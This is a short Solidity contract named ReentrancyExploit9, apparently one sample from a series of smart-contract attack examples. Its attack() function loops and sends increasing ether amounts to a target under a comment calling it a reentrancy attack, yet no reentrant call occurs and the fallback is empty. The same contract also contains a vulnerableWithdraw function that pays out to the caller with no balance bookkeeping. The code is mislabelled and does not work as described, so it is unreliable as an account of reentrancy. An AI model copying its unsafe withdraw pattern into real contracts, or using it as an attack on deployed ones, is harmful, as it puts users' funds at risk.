pragma solidity ^0.8.0;

contract ReentrancyExploit9 {
    address public target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function attack() public payable {
        // Exploit: Reentrancy attack with varying amounts and increasing calls
        uint amount = 0.1 ether;
        for (uint i = 0; i < 10; i++) {
            (bool success, ) = target.call{value: amount}("");
            require(success, "Call failed");
            amount += 0.1 ether;
        }
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function vulnerableWithdraw(uint amount) public {
        require(amount <= address(this).balance, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    fallback() external payable {}
}
